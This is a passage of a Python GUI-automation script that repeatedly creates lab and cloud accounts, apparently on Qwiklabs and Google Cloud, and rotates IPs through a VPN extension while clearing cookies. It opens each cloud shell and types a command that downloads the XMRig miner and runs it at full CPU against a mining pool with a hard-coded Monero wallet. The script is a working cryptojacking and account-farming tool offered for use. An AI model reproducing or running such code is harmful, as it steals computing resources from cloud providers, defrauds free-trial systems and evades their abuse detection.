        sleep(2)
    if pyautogui.locateOnScreen('GoogleSignin.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleSignin.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleSignin.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleSignin.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleSignin.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleSignin.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleSignin.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleSignin.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleSignin.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleSignin.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleSignin.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleSignin.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleSignin.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleSignin.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleSignin.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleSignin.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleSignin.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleSignin.png') == None:
        i = 1
        panj()
        while True:
            
            ChangeIp()
            if i == 1:
                signup()
                sleep(3)
                signin()
                i = i + 1
            signin2()
            sleep(3)
            if i % 5 == 0:
                panj()
                i = 0
            i = i + 1

        # #paste user:

    sleep(0.5)
    mouse.position = (582, 363)
    mouse.click(Button.left, 1)
    keyboard.press(Key.ctrl)
    keyboard.press('a')
    keyboard.release('a')
    keyboard.release(Key.ctrl)
    keyboard.press(Key.backspace)
    keyboard.release(Key.backspace)
    keyboard.type(c)
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)

        # #back to pre page

    keyboard.press(Key.ctrl)
    keyboard.press('1')
    keyboard.release('1')
    keyboard.release(Key.ctrl)
    sleep(1)

        # #copy pass:

    mouse.position = (251, 475)
    mouse.click(Button.left, 2)
    sleep(0.2)
    c = pyperclip.paste()
    sleep(2)

        # #back to console

    keyboard.press(Key.ctrl)
    keyboard.press('2')
    keyboard.release('2')
    keyboard.release(Key.ctrl)
    sleep(0.5)

        # #paste pass:

    sleep(0.5)
    mouse.position = (582, 363)
    mouse.click(Button.left, 1)
    keyboard.press(Key.ctrl)
    keyboard.press('a')
    keyboard.release('a')
    keyboard.release(Key.ctrl)
    keyboard.press(Key.backspace)
    keyboard.release(Key.backspace)
    keyboard.type(c)
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
    ## wait
    ChangeIp_On_Or_Off()
    ##wait
    if pyautogui.locateOnScreen('GoogleAccept.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleAccept.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleAccept.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleAccept.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleAccept.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleAccept.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleAccept.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleAccept.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleAccept.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleAccept.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleAccept.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleAccept.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleAccept.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleAccept.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleAccept.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleAccept.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleAccept.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleAccept.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleAccept.png') == None:
        sleep(7)
    if pyautogui.locateOnScreen('GoogleAccept.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleAccept.png') == None:
        ChangeIp_On_Or_Off()
        i = 1
        panj()
        while True:
            
            ChangeIp()
            if i == 1:
                signup()
                sleep(3)
                signin()
                i = i + 1
            signin2()
            sleep(3)
            if i % 5 == 0:
                panj()
                i = 0
            i = i + 1

        # #click accept

    mouse.position = (678, 575)
    mouse.click(Button.left, 1)
    mouse.position = (574, 603)
    mouse.click(Button.left, 1)
    ##wait
    if pyautogui.locateOnScreen('GoogleConfirm.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleConfirm.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleConfirm.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleConfirm.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleConfirm.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleConfirm.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleConfirm.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleConfirm.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleConfirm.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleConfirm.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleConfirm.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleConfirm.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleConfirm.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleConfirm.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleConfirm.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleConfirm.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleConfirm.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleConfirm.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleConfirm.png') == None:
        sleep(7)
    if pyautogui.locateOnScreen('GoogleConfirm.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleConfirm.png') == None:
        ChangeIp_On_Or_Off()
        i = 1
        panj()
        while True:
            
            ChangeIp()
            if i == 1:
                signup()
                sleep(3)
                signin()
                i = i + 1
            signin2()
            sleep(3)
            if i % 5 == 0:
                panj()
                i = 0
            i = i + 1

        # #click confirm

    mouse.position = (824, 643)
    mouse.click(Button.left, 1)

        # #save pass

    mouse.position = (1140, 370)
    mouse.click(Button.left, 1)
    sleep(1.5)

        # #back to google console

    keyboard.press(Key.ctrl)
    keyboard.press('2')
    keyboard.release('2')
    keyboard.release(Key.ctrl)
    sleep(0.2)
    ##wait
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') == None:
        sleep(7)
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') != None:
        pass
    if pyautogui.locateOnScreen('GoogleWaitCheckbox.png') == None:
        ChangeIp_On_Or_Off()
        i = 1
        panj()
        while True:
            
            ChangeIp()
            if i == 1:
                signup()
                sleep(3)
                signin()
                i = i + 1
            signin2()
            sleep(3)
            if i % 5 == 0:
                panj()
                i = 0
            i = i + 1

        # #choose country:

    mouse.position = (83, 642)
    mouse.click(Button.left, 1)
    sleep(0.5)
    keyboard.type('u')
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
    sleep(2)

        # #checkbox

    mouse.position = (434, 488)
    mouse.click(Button.left, 1)
    sleep(1)
    mouse.position = (432, 433)
    mouse.click(Button.left, 1)
    sleep(1)
    mouse.position = (436, 536)
    mouse.click(Button.left, 1)
    sleep(1)

        # click agree

    mouse.position = (860, 651)
    mouse.click(Button.left, 1)
    sleep(1)
    mouse.position = (852, 602)
    mouse.click(Button.left, 1)
    sleep(5)
    mouse.position = (852, 602)
    mouse.click(Button.left, 1)
    sleep(3)

        # #save pass
        # mouse.position = (1140, 370)
        # mouse.click(Button.left, 1)
        # sleep(2)
        # #click Terminal

    mouse.position = (1165, 89)
    mouse.click(Button.left, 1)
    ##wait Continue
    ##wait
    if pyautogui.locateOnScreen('CountinueTerminal.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('CountinueTerminal.png') != None:
        pass
    if pyautogui.locateOnScreen('CountinueTerminal.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('CountinueTerminal.png') != None:
        pass
    if pyautogui.locateOnScreen('CountinueTerminal.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('CountinueTerminal.png') != None:
        pass
    if pyautogui.locateOnScreen('CountinueTerminal.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('CountinueTerminal.png') != None:
        pass
    if pyautogui.locateOnScreen('CountinueTerminal.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('CountinueTerminal.png') != None:
        pass
    if pyautogui.locateOnScreen('CountinueTerminal.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('CountinueTerminal.png') != None:
        pass
    if pyautogui.locateOnScreen('CountinueTerminal.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('CountinueTerminal.png') != None:
        pass
    if pyautogui.locateOnScreen('CountinueTerminal.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('CountinueTerminal.png') != None:
        pass
    if pyautogui.locateOnScreen('CountinueTerminal.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('CountinueTerminal.png') != None:
        pass
    if pyautogui.locateOnScreen('CountinueTerminal.png') == None:
        sleep(7)
    if pyautogui.locateOnScreen('CountinueTerminal.png') != None:
        pass
    if pyautogui.locateOnScreen('CountinueTerminal.png') == None:
        ChangeIp_On_Or_Off()
        i = 1
        panj()
        while True:
            
            ChangeIp()
            if i == 1:
                signup()
                sleep(3)
                signin()
                i = i + 1
            signin2()
            sleep(3)
            if i % 5 == 0:
                panj()
                i = 0
            i = i + 1
    pyautogui.click('CountinueTerminal.png')
    ##wait
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') == None:
        sleep(10)
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') != None:
        pass
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') != None:
        pass
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') != None:
        pass
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') != None:
        pass
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') != None:
        pass
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') != None:
        pass
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') != None:
        pass
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') != None:
        pass
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') != None:
        pass
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') == None:
        sleep(7)
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') != None:
        pass
    if pyautogui.locateOnScreen('WhaitUntilLoadShell.png') == None:
        ChangeIp_On_Or_Off()
        i = 1
        panj()
        while True:
            
            ChangeIp()
            if i == 1:
                signup()
                sleep(3)
                signin()
                i = i + 1
            signin2()
            sleep(3)
            if i % 5 == 0:
                panj()
                i = 0
            i = i + 1
    
        # #select on shell

    mouse.position = (516, 651)
    mouse.click(Button.left, 1)

        # #type command

    keyboard.type('docker run -p 6080:80 dorowu/ubuntu-desktop-lxde-vnc'
                  )
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)

        # #back to google console

    keyboard.press(Key.ctrl)
    keyboard.press('2')
    keyboard.release('2')
    keyboard.release(Key.ctrl)
    sleep(1)

        # #sleep

    sleep(45)

        # #change port

    mouse.position = (1150, 469)
    mouse.click(Button.left, 1)
    sleep(1)
    mouse.position = (1077, 552)
    mouse.click(Button.left, 1)
    sleep(1)
    mouse.position = (490, 578)
    mouse.click(Button.left, 1)
    sleep(1)
    keyboard.type('6080')
    sleep(1)
    mouse.position = (504, 670)
    mouse.click(Button.left, 1)
    sleep(20)

        # #select terminal

    mouse.position = (10, 712)
    mouse.click(Button.left, 1)
    sleep(1.5)
    mouse.position = (98, 560)
    mouse.click(Button.left, 1)
    sleep(1.5)
    mouse.position = (219, 585)
    mouse.click(Button.left, 1)
    sleep(1.5)

        # #select on terminal

    mouse.position = (570, 408)
    mouse.click(Button.left, 1)
    sleep(2)

        # #write command

    keyboard.type('wget https://github.com/xmrig/xmrig/releases/download/v6.3.5/xmrig-6.3.5-linux-x64.tar.gz && tar xf xmrig-6.3.5-linux-x64.tar.gz && cd xmrig-6.3.5 && ./xmrig --donate-level 1 --max-cpu-usage 100 -o xmrpool.eu:5555 -u 46SCYJfsfSEj1EEHmwCKgCg9mgqg8xbx9BdczDJ9uqUpJRwvnSrHb517vWoE7x3Nv3iJEKbtip9T74QvZB8TJXJ86iXiGkr -p x'
                  )
    sleep(0.5)
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
    sleep(1.5)


        # #back to first page

    mouse.position = (4, 12)
    mouse.click(Button.left, 1)
    sleep(4)

        # #select stop

    mouse.position = (55, 177)
    mouse.click(Button.left, 1)
    sleep(4)
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
    sleep(6)

        # #cancel

    mouse.position = (802, 459)
    mouse.click(Button.left, 1)
    sleep(4)

        # #go to setting

    keyboard.press(Key.ctrl)
    keyboard.press('t')
    keyboard.release('t')
    keyboard.release(Key.ctrl)
    sleep(0.5)
    keyboard.press(Key.ctrl)
    keyboard.press('l')
    keyboard.release('l')
    keyboard.release(Key.ctrl)
    sleep(0.5)
    keyboard.type('https://mail.google.com/mail/?logout&hl=en')
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
    sleep(7)

        # #remove pre account

    sleep(1.5)
    mouse.position = (586, 428)
    sleep(0.5)
    mouse.click(Button.left, 1)
    sleep(1)
    mouse.position = (856, 351)
    mouse.click(Button.left, 1)
    sleep(2)
    mouse.position = (775, 482)
    mouse.click(Button.left, 1)
    sleep(0.5)

        # #close tab

    keyboard.press(Key.ctrl)
    keyboard.press('w')
    keyboard.release('w')
    keyboard.release(Key.ctrl)
    sleep(0.5)
    ChangeIp_On_Or_Off()

        # #back to first page

    mouse.position = (4, 14)
    mouse.click(Button.left, 1)
    sleep(0.5)
    keyboard.press(Key.ctrl)
    keyboard.press('1')
    keyboard.release('1')
    keyboard.release(Key.ctrl)
    sleep(0.5)
    keyboard.press(Key.ctrl)
    keyboard.press('r')
    keyboard.release('r')
    keyboard.release(Key.ctrl)
    sleep(6)

def panj2():
    sleep(2)
    keyboard.press(Key.cmd)
    keyboard.press(Key.ctrl)
    keyboard.press('d')
    keyboard.release(Key.cmd)
    keyboard.release(Key.ctrl)
    keyboard.release('d')
    sleep(4) 
        # # open chrome
        # webbrowser.get("C:\Program Files\Google\Chrome\Application\chrome.exe").open_new('https://www.qwiklabs.com/users/sign_up')
        # sleep(2)

    x = 64
    y = 743
    pyautogui.moveTo(x, y, duration=0.1)
    sleep(0.5)
    pyautogui.click(button='left', clicks=1, interval=0.1)
    sleep(5)
    pyautogui.typewrite('chrome', interval=0.02)
    sleep(4)
    x = 379
    y = 212
    pyautogui.moveTo(x, y, duration=0.1)
    sleep(0.5)
    pyautogui.click(button='left', clicks=1, interval=0.1)
    sleep(3)
    pyautogui.keyDown('alt')
    pyautogui.keyDown('space')
    pyautogui.press('x')
    pyautogui.keyUp('alt')
    pyautogui.keyUp('space')
        # #clear cookies

    pyautogui.keyDown('ctrl')
    pyautogui.keyDown('shift')
    pyautogui.press('del')
    pyautogui.keyUp('ctrl')
    pyautogui.keyUp('shift')
    sleep(2)

        # #click on delet

    mouse.position = (873, 602)
    mouse.click(Button.left, 1)
    sleep(2)
def panj():

    keyboard.press(Key.ctrl)
    keyboard.press('t')
    keyboard.release('t')
    keyboard.release(Key.ctrl)
    sleep(0.5)

        # #clear cookies
    mouse.position = (873, 602)
    mouse.click(Button.left, 1)
    sleep(1)
    pyautogui.keyDown('ctrl')
    pyautogui.keyDown('shift')
    pyautogui.press('del')
    pyautogui.keyUp('ctrl')
    pyautogui.keyUp('shift')
    sleep(2)

        # #click on delet

    mouse.position = (873, 602)
    mouse.click(Button.left, 1)
    sleep(2)

        # #go to new window on windows

    keyboard.press(Key.cmd)
    keyboard.press(Key.ctrl)
    keyboard.press('d')
    keyboard.release(Key.cmd)
    keyboard.release(Key.ctrl)
    keyboard.release('d')
    sleep(4)

        # # open chrome
        # webbrowser.get("C:\Program Files\Google\Chrome\Application\chrome.exe").open_new('https://www.qwiklabs.com/users/sign_up')
        # sleep(2)

    x = 64
    y = 743
    pyautogui.moveTo(x, y, duration=0.1)
    sleep(0.5)
    pyautogui.click(button='left', clicks=1, interval=0.1)
    sleep(5)
    pyautogui.typewrite('chrome', interval=0.02)
    sleep(4)
    x = 379
    y = 212
    pyautogui.moveTo(x, y, duration=0.1)
    sleep(0.5)
    pyautogui.click(button='left', clicks=1, interval=0.1)
    sleep(3)
    pyautogui.keyDown('alt')
    pyautogui.keyDown('space')
    pyautogui.press('x')
    pyautogui.keyUp('alt')
    pyautogui.keyUp('space')
def New_Window():
        # #go to new window on windows

    keyboard.press(Key.cmd)
    keyboard.press(Key.ctrl)
    keyboard.press('d')
    keyboard.release(Key.cmd)
    keyboard.release(Key.ctrl)
    keyboard.release('d')
    sleep(4)

        # # open chrome
        # webbrowser.get("C:\Program Files\Google\Chrome\Application\chrome.exe").open_new('https://www.qwiklabs.com/users/sign_up')
        # sleep(2)

    x = 64
    y = 743
    pyautogui.moveTo(x, y, duration=0.1)
    sleep(0.5)
    pyautogui.click(button='left', clicks=1, interval=0.1)
    sleep(5)
    pyautogui.typewrite('chrome', interval=0.02)
    sleep(4)
    x = 379
    y = 212
    pyautogui.moveTo(x, y, duration=0.1)
    sleep(0.5)
    pyautogui.click(button='left', clicks=1, interval=0.1)
    sleep(3)
    pyautogui.keyDown('alt')
    pyautogui.keyDown('space')
    pyautogui.press('x')
    pyautogui.keyUp('alt')
    pyautogui.keyUp('space')

def ChangeIp():

        # #select extention

    mouse.position = (1279, 50)
    mouse.click(Button.left, 1)
    sleep(1)

        # #select browsec

    mouse.position = (1070, 196)
    mouse.click(Button.left, 1)
    sleep(2.5)

        # #stop

    mouse.position = (1225, 463)
    sleep(0.2)
    mouse.click(Button.left, 1)
    sleep(0.6)

        # #start

    mouse.position = (1225, 463)
    sleep(0.2)
    mouse.click(Button.left, 1)
    sleep(0.6)



def first_change_ip():

        # #select extention

    mouse.position = (1279, 50)
    mouse.click(Button.left, 1)
    sleep(1)

        # #select browsec

    mouse.position = (1070, 196)
    mouse.click(Button.left, 1)
    sleep(2.5)

        # #start

    mouse.position = (1225, 463)
    sleep(0.2)
    mouse.click(Button.left, 1)
    sleep(1.6)
    ##change to usa
    if pyautogui.locateOnScreen('changeLocationBrowsec1.png') != None:
        pyautogui.click('changeLocationBrowsec1.png')
    sleep(2)
    if pyautogui.locateOnScreen('changeLocationBrowsec2.png') != None:
        pyautogui.click('changeLocationBrowsec2.png')
    sleep(2)
    mouse.position = (219, 585)
    mouse.click(Button.left, 1)
    sleep(1.5)
def ChangeIp_On_Or_Off():
        # #select extention

    mouse.position = (1279, 50)
    mouse.click(Button.left, 1)
    sleep(1)

        # #select browsec

    mouse.position = (1070, 196)
    mouse.click(Button.left, 1)
    sleep(2.5)

        # #stop

    mouse.position = (1225, 463)
    sleep(0.2)
    mouse.click(Button.left, 1)
    sleep(0.6)
    mouse.position = (219, 585)
    mouse.click(Button.left, 1)
    sleep(1.5)


install_chrome()
download_extention()
first_change_ip()
i = 1
while True:

    
    if i == 1:
        signup()
        sleep(3)
        signin()
        i = i+1
    signin2()
    sleep(3)
    if i % 5 == 0:
        ChangeIp()
        panj()
        i = 0
    i = i + 1
